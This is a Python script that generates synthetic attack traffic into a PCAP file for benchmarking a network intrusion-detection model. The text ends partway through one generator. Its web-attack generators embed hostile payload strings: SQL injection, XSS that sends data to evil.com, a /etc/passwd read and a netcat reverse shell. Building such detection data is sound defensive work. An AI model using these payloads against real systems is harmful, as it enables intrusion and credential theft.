#!/usr/bin/env python3
"""
Generate a comprehensive adversarial benchmark PCAP dataset.

Creates synthetic network traffic covering ALL 34 CIC-IoT-2023 attack classes,
PQ-TLS handshake scenarios (Kyber-512/768/1024), adversarial perturbation flows,
and simulated banking/government service attacks — all in a single PCAP file.

The PCAP is processed by NFStream in the RobustIDPS.ai backend to extract
flow-level features, which feed into the 83-feature SurrogateIDS model.

Usage:
    pip install scapy   # if not installed
    python generate_adversarial_pcap.py [--flows 3000] [--output adversarial_benchmark.pcap]

Target: ~10 MB PCAP file with ~3000 flows across 34 attack categories.
"""

import argparse
import os
import random
import struct
import time as _time

# Scapy imports
from scapy.all import (
    Ether, IP, IPv6, TCP, UDP, ICMP, ARP, DNS, DNSQR,
    Raw, RandShort, wrpcap,
)
from scapy.layers.http import HTTPRequest

# Deterministic seed for reproducibility
random.seed(2025)

# ── All 34 attack classes ─────────────────────────────────────────────────

CLASS_NAMES = [
    "Benign",
    "DDoS-TCP_Flood", "DDoS-UDP_Flood", "DDoS-ICMP_Flood",
    "DDoS-HTTP_Flood", "DDoS-SYN_Flood", "DDoS-SlowLoris",
    "DDoS-RSTFIN_Flood", "DDoS-Pshack_Flood",
    "DDoS-ACK_Fragmentation", "DDoS-UDP_Fragmentation",
    "DDoS-ICMP_Fragmentation",
    "Recon-PortScan", "Recon-OSScan", "Recon-HostDiscovery",
    "Recon-PingSweep",
    "BruteForce-SSH", "BruteForce-FTP", "BruteForce-HTTP",
    "BruteForce-Dictionary",
    "Spoofing-ARP", "Spoofing-DNS", "Spoofing-IP",
    "WebAttack-SQLi", "WebAttack-XSS",
    "WebAttack-CommandInjection", "WebAttack-BrowserHijacking",
    "Malware-Backdoor", "Malware-Ransomware", "Malware-Trojan",
    "DoS-Slowhttptest", "DoS-Hulk",
    "Mirai-greeth_flood", "Mirai-greip_flood",
]

# ── Service target subnets (banking / government / enterprise) ────────────

BANKING_SERVERS = [f"10.100.{i}.{j}" for i in range(1, 4) for j in range(1, 20)]
GOV_SERVERS = [f"10.200.{i}.{j}" for i in range(1, 3) for j in range(1, 15)]
ENTERPRISE_SERVERS = [f"10.50.{i}.{j}" for i in range(1, 5) for j in range(1, 30)]
ATTACKER_IPS = [f"192.168.{i}.{j}" for i in range(1, 20) for j in range(1, 255)]
IOT_IPS = [f"172.16.{i}.{j}" for i in range(1, 10) for j in range(1, 50)]

# PQC-related ports
PQ_TLS_PORT = 443
PQ_KEM_PORT = 4433  # Custom PQ key exchange
BANKING_PORTS = [443, 8443, 9443]
GOV_PORTS = [443, 8080, 636]  # HTTPS, alt-HTTP, LDAPS


def _rand_ip(pool):
    return random.choice(pool)


def _rand_ts(base, jitter=0.001):
    """Return a slightly incrementing timestamp."""
    return base + random.uniform(0, jitter)


def _rand_payload(min_b=10, max_b=200):
    return Raw(load=os.urandom(random.randint(min_b, max_b)))


# ── Flow generators per attack class ─────────────────────────────────────
# Each returns a list of Scapy packets representing one flow.

def gen_benign(base_ts):
    """Normal HTTPS browsing session."""
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS + GOV_SERVERS + ENTERPRISE_SERVERS)
    sport = random.randint(49152, 65535)
    dport = random.choice([80, 443, 8080])
    ts = base_ts
    pkts = []
    # TCP handshake
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S") / _rand_payload(0, 0))
    ts += random.uniform(0.001, 0.01)
    pkts.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA") / _rand_payload(0, 0))
    ts += random.uniform(0.001, 0.01)
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A") / _rand_payload(0, 0))
    # Data exchange (3-8 packets)
    for _ in range(random.randint(3, 8)):
        ts += random.uniform(0.01, 0.5)
        sender, receiver = random.choice([(src, dst), (dst, src)])
        sp, dp = (sport, dport) if sender == src else (dport, sport)
        pkts.append(IP(src=sender, dst=receiver) / TCP(sport=sp, dport=dp, flags="PA") / _rand_payload(50, 1400))
    # FIN
    ts += random.uniform(0.01, 0.1)
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="FA") / _rand_payload(0, 0))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="FA") / _rand_payload(0, 0))
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.005)
    return pkts


def gen_pq_tls_benign(base_ts, kyber_variant="768"):
    """Post-quantum TLS 1.3 handshake (Kyber key exchange)."""
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS + GOV_SERVERS)
    sport = random.randint(49152, 65535)
    dport = PQ_TLS_PORT
    ts = base_ts

    # Key sizes per Kyber variant
    key_sizes = {"512": 800, "768": 1184, "1024": 1568}
    pk_size = key_sizes.get(kyber_variant, 1184)
    ct_size = pk_size + 32  # ciphertext slightly larger

    pkts = []
    # ClientHello with PQ key share
    ch_payload = os.urandom(pk_size + random.randint(100, 300))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S") / Raw(load=b""))
    ts += random.uniform(0.001, 0.005)
    pkts.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA") / Raw(load=b""))
    ts += random.uniform(0.001, 0.003)
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA") / Raw(load=ch_payload))
    ts += random.uniform(0.002, 0.015)
    # ServerHello with PQ ciphertext
    sh_payload = os.urandom(ct_size + random.randint(200, 500))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="PA") / Raw(load=sh_payload))
    ts += random.uniform(0.001, 0.008)
    # Application data (2-4 exchanges)
    for _ in range(random.randint(2, 4)):
        sender, receiver = random.choice([(src, dst), (dst, src)])
        sp, dp = (sport, dport) if sender == src else (dport, sport)
        pkts.append(IP(src=sender, dst=receiver) / TCP(sport=sp, dport=dp, flags="PA") / _rand_payload(100, 1200))
        ts += random.uniform(0.005, 0.05)
    # Clean close
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="FA") / Raw(load=b""))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="FA") / Raw(load=b""))
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.002)
    return pkts


# ── DDoS attacks ──────────────────────────────────────────────────────────

def gen_ddos_tcp_flood(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS + GOV_SERVERS)
    dport = random.choice(BANKING_PORTS)
    pkts = []
    for i in range(random.randint(80, 200)):
        sport = random.randint(1024, 65535)
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S") / _rand_payload(0, 50))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.002)
    return pkts


def gen_ddos_udp_flood(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(ENTERPRISE_SERVERS)
    dport = random.choice([53, 123, 161, 1900])
    pkts = []
    for _ in range(random.randint(100, 300)):
        pkts.append(IP(src=src, dst=dst) / UDP(sport=random.randint(1024, 65535), dport=dport) / _rand_payload(50, 1400))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.00005, 0.001)
    return pkts


def gen_ddos_icmp_flood(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    pkts = []
    for _ in range(random.randint(80, 200)):
        pkts.append(IP(src=src, dst=dst) / ICMP(type=8) / _rand_payload(56, 1400))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.002)
    return pkts


def gen_ddos_http_flood(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS)
    dport = 80
    pkts = []
    for _ in range(random.randint(30, 80)):
        sport = random.randint(1024, 65535)
        http_req = b"GET / HTTP/1.1\r\nHost: bank-service.local\r\n\r\n"
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA") / Raw(load=http_req))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.01)
    return pkts


def gen_ddos_syn_flood(base_ts):
    dst = random.choice(GOV_SERVERS)
    dport = random.choice([443, 80, 22])
    pkts = []
    for _ in range(random.randint(100, 300)):
        src = f"192.168.{random.randint(1,254)}.{random.randint(1,254)}"  # Spoofed sources
        pkts.append(IP(src=src, dst=dst) / TCP(sport=random.randint(1024, 65535), dport=dport, flags="S"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.00005, 0.001)
    return pkts


def gen_ddos_slowloris(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS)
    sport = random.randint(49152, 65535)
    dport = 80
    pkts = []
    # Open connection
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S"))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA"))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A"))
    # Send partial headers very slowly
    headers = [b"GET / HTTP/1.1\r\n", b"Host: bank.local\r\n",
               b"X-a: b\r\n", b"X-c: d\r\n", b"X-e: f\r\n"]
    ts = base_ts
    for h in headers:
        ts += random.uniform(5.0, 15.0)  # Very slow
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA") / Raw(load=h))
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.01)
    return pkts


def gen_ddos_rstfin_flood(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    dport = 443
    pkts = []
    for _ in range(random.randint(80, 200)):
        flags = random.choice(["R", "F", "RF"])
        pkts.append(IP(src=src, dst=dst) / TCP(sport=random.randint(1024, 65535), dport=dport, flags=flags))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.001)
    return pkts


def gen_ddos_pshack_flood(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(ENTERPRISE_SERVERS)
    dport = 443
    pkts = []
    for _ in range(random.randint(80, 200)):
        pkts.append(IP(src=src, dst=dst) / TCP(sport=random.randint(1024, 65535), dport=dport, flags="PA") / _rand_payload(100, 500))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.001)
    return pkts


def gen_ddos_ack_frag(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    dport = 80
    pkts = []
    for _ in range(random.randint(50, 150)):
        # Small fragmented ACK packets
        pkts.append(IP(src=src, dst=dst, flags="MF", frag=0) / TCP(sport=random.randint(1024, 65535), dport=dport, flags="A") / _rand_payload(8, 50))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.002)
    return pkts


def gen_ddos_udp_frag(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(ENTERPRISE_SERVERS)
    pkts = []
    for _ in range(random.randint(50, 150)):
        pkts.append(IP(src=src, dst=dst, flags="MF", frag=0) / UDP(sport=random.randint(1024, 65535), dport=53) / _rand_payload(50, 500))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.002)
    return pkts


def gen_ddos_icmp_frag(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    pkts = []
    for _ in range(random.randint(50, 150)):
        pkts.append(IP(src=src, dst=dst, flags="MF", frag=0) / ICMP() / _rand_payload(100, 1400))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.002)
    return pkts


# ── Reconnaissance ────────────────────────────────────────────────────────

def gen_recon_portscan(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS + GOV_SERVERS)
    pkts = []
    ports = random.sample(range(1, 1024), random.randint(20, 80))
    for port in ports:
        pkts.append(IP(src=src, dst=dst) / TCP(sport=random.randint(40000, 65535), dport=port, flags="S"))
        # Some ports respond, some RST
        if random.random() < 0.15:
            pkts.append(IP(src=dst, dst=src) / TCP(sport=port, dport=pkts[-1][TCP].sport, flags="SA"))
        else:
            pkts.append(IP(src=dst, dst=src) / TCP(sport=port, dport=pkts[-1][TCP].sport, flags="RA"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.05)
    return pkts


def gen_recon_osscan(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    pkts = []
    # Nmap-style OS fingerprinting: varied probes
    for _ in range(random.randint(10, 30)):
        flags = random.choice(["S", "SA", "F", "FPU", "", "SEC"])
        pkts.append(IP(src=src, dst=dst, ttl=random.choice([64, 128, 255])) /
                    TCP(sport=random.randint(40000, 65535), dport=random.choice([22, 80, 443, 445]),
                        flags=flags, window=random.choice([1024, 2048, 4096, 8192, 65535])))
        # Response
        pkts.append(IP(src=dst, dst=src) / TCP(sport=random.choice([22, 80, 443]),
                    dport=pkts[-1][TCP].sport, flags="RA"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.1)
    return pkts


def gen_recon_hostdiscovery(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    subnet = random.choice(["10.100.1", "10.200.1", "10.50.1"])
    pkts = []
    for host in random.sample(range(1, 255), random.randint(15, 50)):
        dst = f"{subnet}.{host}"
        pkts.append(IP(src=src, dst=dst) / ICMP(type=8) / Raw(load=os.urandom(32)))
        if random.random() < 0.3:
            pkts.append(IP(src=dst, dst=src) / ICMP(type=0) / Raw(load=os.urandom(32)))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.1)
    return pkts


def gen_recon_pingsweep(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    subnet = random.choice(["10.100.2", "10.200.2"])
    pkts = []
    for host in range(1, random.randint(30, 100)):
        dst = f"{subnet}.{host}"
        pkts.append(IP(src=src, dst=dst) / ICMP(type=8) / Raw(load=os.urandom(56)))
        if random.random() < 0.4:
            pkts.append(IP(src=dst, dst=src) / ICMP(type=0) / Raw(load=os.urandom(56)))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.02)
    return pkts


# ── Brute Force ───────────────────────────────────────────────────────────

def gen_bruteforce_ssh(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS + BANKING_SERVERS)
    pkts = []
    for _ in range(random.randint(15, 40)):
        sport = random.randint(40000, 65535)
        # SYN
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=22, flags="S"))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=22, dport=sport, flags="SA"))
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=22, flags="A"))
        # Auth attempt
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=22, flags="PA") /
                    Raw(load=os.urandom(random.randint(50, 200))))
        # Rejection
        pkts.append(IP(src=dst, dst=src) / TCP(sport=22, dport=sport, flags="PA") /
                    Raw(load=os.urandom(random.randint(30, 100))))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=22, dport=sport, flags="R"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.5)
    return pkts


def gen_bruteforce_ftp(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(ENTERPRISE_SERVERS)
    pkts = []
    for _ in range(random.randint(15, 40)):
        sport = random.randint(40000, 65535)
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=21, flags="S"))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=21, dport=sport, flags="SA"))
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=21, flags="PA") /
                    Raw(load=b"USER admin\r\n"))
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=21, flags="PA") /
                    Raw(load=f"PASS {os.urandom(8).hex()}\r\n".encode()))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=21, dport=sport, flags="PA") /
                    Raw(load=b"530 Login incorrect.\r\n"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.05, 0.5)
    return pkts


def gen_bruteforce_http(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS)
    pkts = []
    for _ in range(random.randint(20, 50)):
        sport = random.randint(40000, 65535)
        login = f"POST /login HTTP/1.1\r\nHost: bank.local\r\nContent-Length: 40\r\n\r\nuser=admin&pass={os.urandom(6).hex()}"
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="PA") / Raw(load=login.encode()))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="PA") /
                    Raw(load=b"HTTP/1.1 401 Unauthorized\r\n\r\n"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.05, 0.3)
    return pkts


def gen_bruteforce_dict(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    pkts = []
    for _ in range(random.randint(20, 60)):
        sport = random.randint(40000, 65535)
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=random.choice([22, 21, 23, 3389]), flags="PA") /
                    Raw(load=os.urandom(random.randint(30, 150))))
        pkts.append(IP(src=dst, dst=src) / TCP(dport=sport, flags="RA"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.2)
    return pkts


# ── Spoofing ──────────────────────────────────────────────────────────────

def gen_spoofing_arp(base_ts):
    src_mac = "aa:bb:cc:dd:ee:ff"
    pkts = []
    gateway_ip = "10.100.1.1"
    for _ in range(random.randint(20, 60)):
        target_ip = f"10.100.1.{random.randint(2, 254)}"
        pkts.append(Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
                    ARP(op=2, psrc=gateway_ip, hwsrc=src_mac, pdst=target_ip))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.5, 2.0)
    return pkts


def gen_spoofing_dns(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    victim = random.choice(BANKING_SERVERS)
    pkts = []
    domains = [b"bank-secure.com", b"gov-portal.org", b"enterprise-vpn.net",
               b"pqc-keyserver.bank", b"kyber-auth.gov"]
    for _ in range(random.randint(15, 40)):
        domain = random.choice(domains)
        pkts.append(IP(src=src, dst=victim) / UDP(sport=random.randint(1024, 65535), dport=53) /
                    DNS(qd=DNSQR(qname=domain)) / _rand_payload(10, 50))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.1)
    return pkts


def gen_spoofing_ip(base_ts):
    spoofed_src = random.choice(GOV_SERVERS)  # Pretend to be a gov server
    dst = random.choice(BANKING_SERVERS)
    pkts = []
    for _ in range(random.randint(15, 40)):
        pkts.append(IP(src=spoofed_src, dst=dst) / TCP(sport=random.randint(1024, 65535),
                    dport=random.choice([80, 443]), flags="PA") / _rand_payload(50, 500))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.1)
    return pkts


# ── Web Attacks ───────────────────────────────────────────────────────────

def gen_web_sqli(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    sqli_payloads = [
        b"GET /api/user?id=1' OR '1'='1 HTTP/1.1\r\nHost: bank.local\r\n\r\n",
        b"POST /login HTTP/1.1\r\nHost: bank.local\r\n\r\nuser=admin'-- &pass=x",
        b"GET /accounts?q='; DROP TABLE users;-- HTTP/1.1\r\nHost: bank.local\r\n\r\n",
        b"GET /search?q=1 UNION SELECT * FROM credentials HTTP/1.1\r\n\r\n",
    ]
    for payload in sqli_payloads:
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="PA") / Raw(load=payload))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="PA") / _rand_payload(100, 800))
        sport += 1
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.05, 0.3)
    return pkts


def gen_web_xss(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(ENTERPRISE_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    xss_payloads = [
        b"GET /page?q=<script>alert('xss')</script> HTTP/1.1\r\n\r\n",
        b'POST /comment HTTP/1.1\r\n\r\nbody=<img src=x onerror=fetch("http://evil.com/steal")>',
        b"GET /profile?name=<svg onload=alert(document.cookie)> HTTP/1.1\r\n\r\n",
    ]
    for payload in xss_payloads:
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=80, flags="PA") / Raw(load=payload))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=80, dport=sport, flags="PA") / _rand_payload(200, 1200))
        sport += 1
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.05, 0.2)
    return pkts


def gen_web_cmdinj(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    cmds = [
        b"GET /api/ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1\r\n\r\n",
        b"POST /admin/exec HTTP/1.1\r\n\r\ncmd=ls -la /; whoami",
        b"GET /cgi-bin/test?input=|nc -e /bin/sh 192.168.1.1 4444 HTTP/1.1\r\n\r\n",
    ]
    for cmd in cmds:
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="PA") / Raw(load=cmd))
        pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="PA") / _rand_payload(50, 600))
        sport += 1
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.1, 0.5)
    return pkts


def gen_web_browserhijack(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(ENTERPRISE_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    # Inject redirect / iframe
    hijack = [
        b"GET / HTTP/1.1\r\n\r\n",
        b"HTTP/1.1 200 OK\r\n\r\n<html><iframe src='http://evil.com/phish'></iframe></html>",
    ]
    for h in hijack:
        sender = src if hijack.index(h) % 2 == 0 else dst
        receiver = dst if sender == src else src
        sp = sport if sender == src else 80
        dp = 80 if sender == src else sport
        pkts.append(IP(src=sender, dst=receiver) / TCP(sport=sp, dport=dp, flags="PA") / Raw(load=h))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.01, 0.1)
    return pkts


# ── Malware ───────────────────────────────────────────────────────────────

def gen_malware_backdoor(base_ts):
    src = random.choice(IOT_IPS)
    c2 = _rand_ip(ATTACKER_IPS)
    sport = random.randint(40000, 65535)
    dport = random.choice([4444, 5555, 8888, 1337])
    pkts = []
    # C2 beacon pattern: periodic small packets over long duration
    pkts.append(IP(src=src, dst=c2) / TCP(sport=sport, dport=dport, flags="S"))
    pkts.append(IP(src=c2, dst=src) / TCP(sport=dport, dport=sport, flags="SA"))
    ts = base_ts
    for _ in range(random.randint(8, 20)):
        ts += random.uniform(5.0, 30.0)  # Long intervals (beaconing)
        pkts.append(IP(src=src, dst=c2) / TCP(sport=sport, dport=dport, flags="PA") / _rand_payload(20, 80))
        ts += random.uniform(0.1, 1.0)
        pkts.append(IP(src=c2, dst=src) / TCP(sport=dport, dport=sport, flags="PA") / _rand_payload(50, 500))
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.01)
    return pkts


def gen_malware_ransomware(base_ts):
    src = random.choice(IOT_IPS)
    c2 = _rand_ip(ATTACKER_IPS)
    dst_file_server = random.choice(ENTERPRISE_SERVERS)
    pkts = []
    # Key exchange with C2
    pkts.append(IP(src=src, dst=c2) / TCP(sport=random.randint(40000, 65535), dport=443, flags="PA") /
                Raw(load=os.urandom(256)))  # RSA key exchange
    pkts.append(IP(src=c2, dst=src) / TCP(dport=random.randint(40000, 65535), flags="PA") /
                Raw(load=os.urandom(512)))
    # Mass file encryption traffic (lots of SMB-like traffic)
    for _ in range(random.randint(20, 50)):
        pkts.append(IP(src=src, dst=dst_file_server) / TCP(sport=random.randint(40000, 65535),
                    dport=445, flags="PA") / _rand_payload(500, 1400))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.05)
    return pkts


def gen_malware_trojan(base_ts):
    src = random.choice(IOT_IPS)
    c2 = _rand_ip(ATTACKER_IPS)
    pkts = []
    # Initial dropper download
    pkts.append(IP(src=src, dst=c2) / TCP(sport=random.randint(40000, 65535), dport=80, flags="PA") /
                Raw(load=b"GET /update.exe HTTP/1.1\r\nHost: legit-update.com\r\n\r\n"))
    pkts.append(IP(src=c2, dst=src) / TCP(dport=random.randint(40000, 65535), flags="PA") /
                Raw(load=os.urandom(random.randint(500, 1400))))
    # Data exfiltration
    for _ in range(random.randint(5, 15)):
        pkts.append(IP(src=src, dst=c2) / TCP(sport=random.randint(40000, 65535),
                    dport=random.choice([443, 8443, 53]), flags="PA") /
                    _rand_payload(200, 1200))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.5, 5.0)
    return pkts


# ── DoS ───────────────────────────────────────────────────────────────────

def gen_dos_slowhttptest(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=80, flags="S"))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=80, dport=sport, flags="SA"))
    # Send body one byte at a time
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=80, flags="PA") /
                Raw(load=b"POST / HTTP/1.1\r\nContent-Length: 100000\r\n\r\n"))
    ts = base_ts
    for _ in range(random.randint(10, 30)):
        ts += random.uniform(3.0, 10.0)
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=80, flags="PA") / Raw(load=os.urandom(1)))
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.01)
    return pkts


def gen_dos_hulk(base_ts):
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    pkts = []
    for _ in range(random.randint(40, 100)):
        sport = random.randint(1024, 65535)
        # Unique URLs to bypass caching
        path = f"/page?{os.urandom(8).hex()}={os.urandom(4).hex()}"
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=80, flags="PA") /
                    Raw(load=f"GET {path} HTTP/1.1\r\nHost: gov-portal.org\r\n\r\n".encode()))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.01)
    return pkts


# ── Mirai ─────────────────────────────────────────────────────────────────

def gen_mirai_greeth(base_ts):
    src = random.choice(IOT_IPS)
    dst = random.choice(ENTERPRISE_SERVERS + GOV_SERVERS)
    pkts = []
    # GRE encapsulated flood
    for _ in range(random.randint(80, 200)):
        pkts.append(IP(src=src, dst=dst, proto=47) / _rand_payload(100, 1000))  # GRE proto=47
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.001)
    return pkts


def gen_mirai_greip(base_ts):
    src = random.choice(IOT_IPS)
    dst = random.choice(BANKING_SERVERS)
    pkts = []
    for _ in range(random.randint(80, 200)):
        # GRE-IP flood with randomized source in inner packet
        inner = IP(src=f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                   dst=dst) / _rand_payload(50, 800)
        pkts.append(IP(src=src, dst=dst, proto=47) / Raw(load=bytes(inner)))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0001, 0.001)
    return pkts


# ── PQ-specific attack flows ─────────────────────────────────────────────

def gen_pq_downgrade(base_ts):
    """MitM strips PQ key share, forces classical-only handshake."""
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(BANKING_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    # Initial PQ ClientHello
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="S"))
    pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="SA"))
    # Attacker strips Kyber key share, replaces with classical
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="PA") /
                Raw(load=os.urandom(350)))  # Stripped to classical size
    # Re-negotiation attempt
    pkts.append(IP(src=dst, dst=src) / TCP(sport=443, dport=sport, flags="PA") /
                Raw(load=os.urandom(450)))
    pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=443, flags="R"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.001, 0.01)
    return pkts


def gen_pq_harvest_now(base_ts):
    """Harvest-now-decrypt-later: passive mass capture for quantum decryption."""
    src = _rand_ip(ATTACKER_IPS)
    pkts = []
    # Rapid port scanning + passive capture of encrypted sessions
    targets = random.sample(BANKING_SERVERS + GOV_SERVERS, min(10, len(BANKING_SERVERS)))
    for dst in targets:
        for port in [443, 8443, 4433]:
            pkts.append(IP(src=src, dst=dst) / TCP(sport=random.randint(40000, 65535),
                        dport=port, flags="S"))
    ts = base_ts
    for p in pkts:
        p.time = ts
        ts += random.uniform(0.0005, 0.005)
    return pkts


def gen_pq_side_channel(base_ts):
    """Timing attack on ML-KEM decapsulation."""
    src = _rand_ip(ATTACKER_IPS)
    dst = random.choice(GOV_SERVERS)
    sport = random.randint(49152, 65535)
    pkts = []
    # Many repeated handshake attempts with timing analysis
    for _ in range(random.randint(30, 60)):
        pkts.append(IP(src=src, dst=dst) / TCP(sport=sport, dport=PQ_KEM_PORT, flags="PA") /
